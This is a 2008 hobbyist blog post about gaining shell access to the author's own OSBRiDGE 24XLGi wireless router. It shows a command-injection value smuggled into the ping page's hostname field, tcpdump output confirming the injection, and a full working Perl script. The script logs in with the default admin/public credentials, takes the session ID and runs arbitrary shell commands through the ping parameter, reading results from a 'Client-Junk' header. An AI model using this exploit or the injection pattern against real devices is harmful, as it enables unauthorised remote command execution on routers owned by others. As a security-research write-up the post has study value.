+++
title = "Hacking the OSBRiDGE 24XLGi"
date = "2008-05-06T01:20:00+01:00"
description = "Hacking the OSBRiDGE 24XLGi through the web interface"
tags = ["hacking"]
+++

A friend gave me an [OSBRiDGE 24XLGi](http://www.osbridge.com/download/OSBRiDGE_24XLG.pdf), its case broke and was not suitable for outdoor use anymore.  
The router is pretty closed: a network scan doesn't reveal any open port other than the web interface one and connecting to the serial port reveals a crippled bootloader.  
Firmware upgrade is done via the web interface, and the firmware is checked for integrity.

The web interface has the usual features found in a router, along with a "service" page which allows you to ping a host.  
I suspected that it just execs ping via the system shell, but the hostname size is limited to 15 characters (12 numbers and 3 dots).  
Nothing that can't be cheated with the browser inspector, so I did it and tried to ping the hostname "192.168.1.129 ; ping 192.168.1.150", with 192.168.1.129 being my notebook IP and 192.168.1.150 an unused one.

Concurrently, I started a tcpdump on the notebook and noticed the osbridge sending ARP packets trying to resolve the MAC address for 192.168.1.150.
This means that the injection works!

```
IP 192.168.1.250 > 192.168.1.129: ICMP echo request, id 28003, seq 0, length 68
IP 192.168.1.129 > 192.168.1.250: ICMP echo reply, id 28003, seq 0, length 68
arp who-has 192.168.1.150 tell 192.168.1.250 
arp who-has 192.168.1.150 tell 192.168.1.250 
```

I started injecting some commands by crafting HTTP requests with cURL, and when executing a nonexistent command I got this HTTP header:

```
Client-Junk: sh: xxxcmd: not found
```

This means the web server redirects the command stderr and returns it in a custom HTTP header named "Client-Junk".

So I wrote a perl script which injects commands:

```
$ ./inject.pl uname -a
Linux (none) 2.4.18-MIPS-01.00 #653 ro maj 23 11:38:56 CEST 2007 mips unknown
```

The script is pretty simple. It logs in, gets the session ID, injects the command, prints the output and extracts the stderr from the HTTP headers:
```perl
#!/usr/bin/perl -w

use strict;
use warnings;

use LWP::UserAgent;
use HTTP::Request::Common qw(GET);

my $ua = LWP::UserAgent->new();
my $req = HTTP::Request->new(GET => 'http://192.168.1.250/cgi-bin/cgi?www=login&login=admin&password=public');
my $content = $ua->request($req)->as_string;
my $id;

if($content =~ /www=applycfg&IDs=(\d{30})/) {
	$id = $1;
} else {
	die "Can't find ID (wrong password?)";
}

my $url = "http://192.168.1.250/cgi-bin/cgi?www=ping&IDs=$id&hostip=127.0.0.1 ; @ARGV >/proc/self/fd/2&packetsize=60&packetcount=1&submit=Ping";

print "[~] @ARGV\n";

$req = HTTP::Request->new(GET => $url);

$content = $ua->request($req)->as_string;

while ($content =~ /^Client-Junk: (.*)/mg) {
	print "$1\n";
}
```

Although this isn't of any practical use, it was a fun hacking exercise!
